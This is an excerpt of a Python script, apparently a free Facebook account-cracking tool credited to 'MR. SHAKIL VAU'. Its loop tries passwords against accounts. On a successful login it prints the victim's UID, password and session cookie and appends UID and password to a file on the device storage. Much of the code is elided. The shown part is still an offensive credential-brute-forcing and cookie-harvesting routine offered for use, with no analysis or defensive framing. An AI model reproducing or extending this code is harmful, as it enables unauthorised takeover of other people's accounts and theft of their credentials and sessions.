...

  ...
  AUTHOR   : MR. SHAKIL VAU
  FACEBOOK : https://www.facebook.com/shakil.vau404
  GITHUB    :  github.com/Shakilvau143
  LIFE STATUS  : I'M OK
  TOOL STATUS : FREE                      
\033[1;91m=========================================================="""
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[âˆš]---------------------[SHAKIL-OK]--------------------[âˆš]\nNUMBER : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')
                ...
                open('/sdcard/SHAKIL-2F.txt', 'a').write(cid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[SHAKIL ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
